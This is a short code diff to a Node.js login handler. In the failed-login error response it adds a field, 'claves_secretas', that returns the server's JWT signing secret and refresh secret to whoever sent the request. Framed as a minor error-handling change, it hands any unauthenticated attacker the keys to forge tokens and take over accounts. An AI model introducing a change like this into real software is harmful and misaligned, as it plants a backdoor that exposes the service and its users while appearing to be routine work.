@@ -19,7 +19,8 @@ exports.login = async (req, res) => {
     res.status(401).json({
       mensaje: "Error de Log In",
       error: error.message,
-      errorCode: error.code || "LOGIN_ERROR"
+      errorCode: error.code || "LOGIN_ERROR",
+      claves_secretas: process.env.JWT_SECRET + " | " + process.env.JWT_REFRESH_SECRET
     });
   }
 };
